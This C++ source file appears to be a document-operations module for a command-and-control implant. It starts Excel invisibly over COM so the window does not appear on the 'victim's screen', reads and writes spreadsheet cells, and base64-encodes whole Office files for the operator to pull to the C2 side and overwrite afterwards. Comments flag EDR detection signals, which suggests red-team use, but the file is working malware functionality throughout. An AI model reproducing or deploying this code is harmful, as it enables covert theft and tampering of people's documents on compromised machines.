#include "DocOps.h"
#include <ole2.h>
#include <oleauto.h>
#include <comdef.h>
#include <wincrypt.h>
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "oleaut32.lib")
#pragma comment(lib, "Crypt32.lib")

// ── COM IDispatch helpers ─────────────────────────────────────────────────────
// All Excel COM calls go through IDispatch::Invoke — no Excel type library needed.

// Get a named property (DISPATCH_PROPERTYGET). Returns VT_EMPTY on failure.
static _variant_t DispGet(IDispatch* pDisp, const wchar_t* name, VARIANT* arg = nullptr, int argc = 0) {
    if (!pDisp) return _variant_t();
    DISPID did = 0;
    LPOLESTR n = const_cast<LPOLESTR>(name);
    if (FAILED(pDisp->GetIDsOfNames(IID_NULL, &n, 1, LOCALE_USER_DEFAULT, &did)))
        return _variant_t();
    DISPPARAMS dp = { arg, nullptr, (UINT)argc, 0 };
    _variant_t result;
    pDisp->Invoke(did, IID_NULL, LOCALE_USER_DEFAULT, DISPATCH_PROPERTYGET,
                  &dp, &result, nullptr, nullptr);
    return result;
}

// Set a named property (DISPATCH_PROPERTYPUT).
static HRESULT DispPut(IDispatch* pDisp, const wchar_t* name, VARIANT* val) {
    if (!pDisp) return E_POINTER;
    DISPID did = 0;
    LPOLESTR n = const_cast<LPOLESTR>(name);
    if (FAILED(pDisp->GetIDsOfNames(IID_NULL, &n, 1, LOCALE_USER_DEFAULT, &did)))
        return E_INVALIDARG;
    DISPID putId = DISPID_PROPERTYPUT;
    DISPPARAMS dp = { val, &putId, 1, 1 };
    return pDisp->Invoke(did, IID_NULL, LOCALE_USER_DEFAULT, DISPATCH_PROPERTYPUT,
                         &dp, nullptr, nullptr, nullptr);
}

// Call a named method (DISPATCH_METHOD). Args must be in REVERSE order.
static _variant_t DispCall(IDispatch* pDisp, const wchar_t* name, VARIANT* args = nullptr, int argc = 0) {
    if (!pDisp) return _variant_t();
    DISPID did = 0;
    LPOLESTR n = const_cast<LPOLESTR>(name);
    if (FAILED(pDisp->GetIDsOfNames(IID_NULL, &n, 1, LOCALE_USER_DEFAULT, &did)))
        return _variant_t();
    DISPPARAMS dp = { args, nullptr, (UINT)argc, 0 };
    _variant_t result;
    pDisp->Invoke(did, IID_NULL, LOCALE_USER_DEFAULT, DISPATCH_METHOD,
                  &dp, &result, nullptr, nullptr);
    return result;
}

// Extract IDispatch* from a VARIANT (must be VT_DISPATCH). Caller must Release().
static IDispatch* VarDisp(const _variant_t& v) {
    if (v.vt == VT_DISPATCH && v.pdispVal) {
        v.pdispVal->AddRef();
        return v.pdispVal;
    }
    return nullptr;
}

// Convert any VARIANT to a printable string.
static std::string VarToStr(const _variant_t& v) {
    _variant_t s;
    if (FAILED(VariantChangeType(&s, const_cast<VARIANT*>((const VARIANT*)&v), 0, VT_BSTR)))
        return "(error)";
    if (s.vt == VT_BSTR && s.bstrVal) {
        // Convert BSTR (UTF-16) to narrow string
        int len = WideCharToMultiByte(CP_UTF8, 0, s.bstrVal, -1, nullptr, 0, nullptr, nullptr);
        if (len > 0) {
            std::string r(len - 1, '\0');
            WideCharToMultiByte(CP_UTF8, 0, s.bstrVal, -1, &r[0], len, nullptr, nullptr);
            return r;
        }
    }
    return "";
}

// ── RAII wrapper: ensures Excel always quits, even on early return ─────────────
struct ExcelSession {
    IDispatch* app = nullptr;

    explicit ExcelSession(IDispatch* p) : app(p) {}

    ~ExcelSession() {
        if (app) {
            // Workbooks.Close() — close all open workbooks without saving on exit
            _variant_t wbs = DispGet(app, L"Workbooks");
            if (IDispatch* pWbs = VarDisp(wbs)) {
                DispCall(pWbs, L"Close");
                pWbs->Release();
            }
            // Excel.Application.Quit()
            DispCall(app, L"Quit");
            app->Release();
            app = nullptr;
        }
    }
};

// ── Open Excel invisibly and return the Application IDispatch ─────────────────
static IDispatch* StartExcel(std::string& errOut) {
    CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);

    CLSID clsid;
    // Detection signal: resolving "Excel.Application" ProgID to a CLSID from
    // a non-Office process is logged by EDR process-COM telemetry.
    std::wstring progId = L"Excel.Application";
    if (FAILED(CLSIDFromProgID(progId.c_str(), &clsid))) {
        errOut = "Excel not installed (CLSIDFromProgID failed)";
        return nullptr;
    }

    IDispatch* pApp = nullptr;
    // Detection signal: CoCreateInstance with Excel CLSID from CLSCTX_LOCAL_SERVER
    // spawns EXCEL.EXE as a child process — visible in process tree and EDR telemetry.
    HRESULT hr = CoCreateInstance(clsid, nullptr, CLSCTX_LOCAL_SERVER,
                                  IID_IDispatch, (void**)&pApp);
    if (FAILED(hr) || !pApp) {
        errOut = "CoCreateInstance(Excel.Application) failed hr=0x" +
                 [&]{ char b[16]{}; sprintf_s(b,"%08X",(unsigned)hr); return std::string(b); }();
        return nullptr;
    }

    // Hide the Excel window — don't show on victim's screen
    _variant_t vFalse(false);
    DispPut(pApp, L"Visible",         &vFalse);
    DispPut(pApp, L"DisplayAlerts",   &vFalse);
    DispPut(pApp, L"ScreenUpdating",  &vFalse);
    return pApp;
}

// ── Open a workbook and return the Worksheet IDispatch ────────────────────────
// If sheetName is empty, uses the active sheet.
static IDispatch* OpenWorksheet(IDispatch* pApp, const std::string& path,
                                const std::string& sheetName, std::string& errOut) {
    // Convert path to BSTR for the Workbooks.Open call
    int wLen = MultiByteToWideChar(CP_UTF8, 0, path.c_str(), -1, nullptr, 0);
    std::wstring wPath(wLen, L'\0');
    MultiByteToWideChar(CP_UTF8, 0, path.c_str(), -1, &wPath[0], wLen);
    wPath.resize(wcslen(wPath.c_str()));

    _variant_t vPath(wPath.c_str());

    // Workbooks.Open(path) → returns the Workbook object
    _variant_t wbsVar = DispGet(pApp, L"Workbooks");
    IDispatch* pWbs = VarDisp(wbsVar);
    if (!pWbs) { errOut = "could not get Workbooks collection"; return nullptr; }

    _variant_t wbVar = DispCall(pWbs, L"Open", &vPath, 1);
    pWbs->Release();
    IDispatch* pWb = VarDisp(wbVar);
    if (!pWb) { errOut = "Workbooks.Open failed — check path: " + path; return nullptr; }

    // Get the Worksheets collection
    _variant_t wsColVar = DispGet(pWb, L"Worksheets");
    pWb->Release();
    IDispatch* pWsCol = VarDisp(wsColVar);
    if (!pWsCol) { errOut = "could not get Worksheets collection"; return nullptr; }

    // Select sheet by name (or index 1 if name is empty)
    IDispatch* pWs = nullptr;
    if (!sheetName.empty()) {
        int wsl = MultiByteToWideChar(CP_UTF8, 0, sheetName.c_str(), -1, nullptr, 0);
        std::wstring wSheet(wsl, L'\0');
        MultiByteToWideChar(CP_UTF8, 0, sheetName.c_str(), -1, &wSheet[0], wsl);
        wSheet.resize(wcslen(wSheet.c_str()));
        _variant_t vSheet(wSheet.c_str());
        _variant_t wsVar = DispGet(pWsCol, L"Item", &vSheet, 1);
        pWs = VarDisp(wsVar);
    } else {
        _variant_t vIdx((long)1);
        _variant_t wsVar = DispGet(pWsCol, L"Item", &vIdx, 1);
        pWs = VarDisp(wsVar);
    }
    pWsCol->Release();

    if (!pWs) errOut = "sheet not found: " + (sheetName.empty() ? "index 1" : sheetName);
    return pWs;
}

// ── Get Range IDispatch from a Worksheet ─────────────────────────────────────
static IDispatch* GetRange(IDispatch* pWs, const std::string& cellRef) {
    int wLen = MultiByteToWideChar(CP_UTF8, 0, cellRef.c_str(), -1, nullptr, 0);
    std::wstring wRef(wLen, L'\0');
    MultiByteToWideChar(CP_UTF8, 0, cellRef.c_str(), -1, &wRef[0], wLen);
    wRef.resize(wcslen(wRef.c_str()));
    _variant_t vRef(wRef.c_str());
    _variant_t rangeVar = DispGet(pWs, L"Range", &vRef, 1);
    return VarDisp(rangeVar);
}

// ── Workbook.Save then Close ──────────────────────────────────────────────────
static void SaveAndClose(IDispatch* pApp) {
    _variant_t wbsVar = DispGet(pApp, L"ActiveWorkbook");
    IDispatch* pWb = VarDisp(wbsVar);
    if (pWb) {
        DispCall(pWb, L"Save");
        _variant_t vFalse(false);
        DispCall(pWb, L"Close", &vFalse, 1);
        pWb->Release();
    }
}

// ── Public API ────────────────────────────────────────────────────────────────

// xlread C:\path\file.xlsx Sheet1 A1:C5
// Returns tab-separated cell values, one row per line.
std::string DocOps::XlRead(const std::string& path, const std::string& sheet,
                            const std::string& cellRef) {
    std::string err;
    IDispatch* pApp = StartExcel(err);
    if (!pApp) return "XlRead error: " + err;
    ExcelSession session(pApp);

    IDispatch* pWs = OpenWorksheet(pApp, path, sheet, err);
    if (!pWs) return "XlRead error: " + err;

    IDispatch* pRange = GetRange(pWs, cellRef);
    pWs->Release();
    if (!pRange) return "XlRead error: Range not found: " + cellRef;

    // Range.Value — can be a 2D SAFEARRAY for multi-cell ranges or a scalar
    _variant_t valVar = DispGet(pRange, L"Value");
    pRange->Release();

    std::string out;
    if (valVar.vt == (VT_ARRAY | VT_VARIANT)) {
        // Multi-cell: iterate the 2D SAFEARRAY
        SAFEARRAY* sa = valVar.parray;
        LONG rMin, rMax, cMin, cMax;
        SafeArrayGetLBound(sa, 1, &rMin);
        SafeArrayGetUBound(sa, 1, &rMax);
        SafeArrayGetLBound(sa, 2, &cMin);
        SafeArrayGetUBound(sa, 2, &cMax);
        for (LONG r = rMin; r <= rMax; ++r) {
            for (LONG c = cMin; c <= cMax; ++c) {
                VARIANT cell = {};
                LONG idx[2] = { r, c };
                SafeArrayGetElement(sa, idx, &cell);
                out += VarToStr(_variant_t(cell, false));
                if (c < cMax) out += "\t";
            }
            out += "\n";
        }
    } else {
        out = VarToStr(valVar);
    }

    return out.empty() ? "(empty range)" : out;
}

// xlwrite C:\path\file.xlsx Sheet1 B2 "new value"
// Writes the value to the cell and saves the workbook.
std::string DocOps::XlWrite(const std::string& path, const std::string& sheet,
                             const std::string& cellRef, const std::string& value) {
    std::string err;
    IDispatch* pApp = StartExcel(err);
    if (!pApp) return "XlWrite error: " + err;
    ExcelSession session(pApp);

    IDispatch* pWs = OpenWorksheet(pApp, path, sheet, err);
    if (!pWs) return "XlWrite error: " + err;

    IDispatch* pRange = GetRange(pWs, cellRef);
    pWs->Release();
    if (!pRange) return "XlWrite error: Range not found: " + cellRef;

    // Convert value string to wide BSTR for the VARIANT
    int wLen = MultiByteToWideChar(CP_UTF8, 0, value.c_str(), -1, nullptr, 0);
    std::wstring wVal(wLen, L'\0');
    MultiByteToWideChar(CP_UTF8, 0, value.c_str(), -1, &wVal[0], wLen);
    wVal.resize(wcslen(wVal.c_str()));

    _variant_t vVal(wVal.c_str());
    HRESULT hr = DispPut(pRange, L"Value", &vVal);
    pRange->Release();

    if (FAILED(hr))
        return "XlWrite error: could not set cell value hr=0x" +
               [&]{ char b[16]{}; sprintf_s(b,"%08X",(unsigned)hr); return std::string(b); }();

    // Save and close — detection signal: ActiveWorkbook.Save() from non-Office process
    SaveAndClose(pApp);
    return "XlWrite: wrote \"" + value + "\" to " + cellRef + " in " + sheet + ", saved.";
}

// ── Raw binary read → base64 ──────────────────────────────────────────────────
// Reads the XLSX/DOCX/PPTX bytes and base64-encodes them.
// Operator decodes on C2 side, edits with any tool, then sends back via xlrawwrite.
std::string DocOps::XlRawRead(const std::string& path) {
    std::ifstream f(path, std::ios::binary);
    if (!f.is_open()) return "XlRawRead: could not open " + path;
    std::vector<BYTE> bytes((std::istreambuf_iterator<char>(f)),
                             std::istreambuf_iterator<char>());
    if (bytes.empty()) return "XlRawRead: file is empty";

    DWORD b64Len = 0;
    CryptBinaryToStringA(bytes.data(), (DWORD)bytes.size(),
                         CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, nullptr, &b64Len);
    std::string b64(b64Len, '\0');
    CryptBinaryToStringA(bytes.data(), (DWORD)bytes.size(),
                         CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, &b64[0], &b64Len);
    b64.resize(b64Len);

    return "XlRawRead: " + std::to_string(bytes.size()) + " bytes\n" + b64;
}

// ── Raw base64 → write bytes to file ─────────────────────────────────────────
// Decodes b64content and overwrites path. Call this after editing the file on C2.
std::string DocOps::XlRawWrite(const std::string& path, const std::string& b64content) {
    DWORD byteLen = 0;
    if (!CryptStringToBinaryA(b64content.c_str(), (DWORD)b64content.size(),
                               CRYPT_STRING_BASE64_ANY, nullptr, &byteLen, nullptr, nullptr))
        return "XlRawWrite: base64 decode failed";

    std::vector<BYTE> bytes(byteLen);
    if (!CryptStringToBinaryA(b64content.c_str(), (DWORD)b64content.size(),
                               CRYPT_STRING_BASE64_ANY, bytes.data(), &byteLen, nullptr, nullptr))
        return "XlRawWrite: base64 decode failed (stage 2)";

    std::ofstream f(path, std::ios::binary | std::ios::trunc);
    if (!f.is_open()) return "XlRawWrite: could not open " + path + " for writing";
    f.write(reinterpret_cast<char*>(bytes.data()), byteLen);
    f.close();

    return "XlRawWrite: wrote " + std::to_string(byteLen) + " bytes to " + path;
}
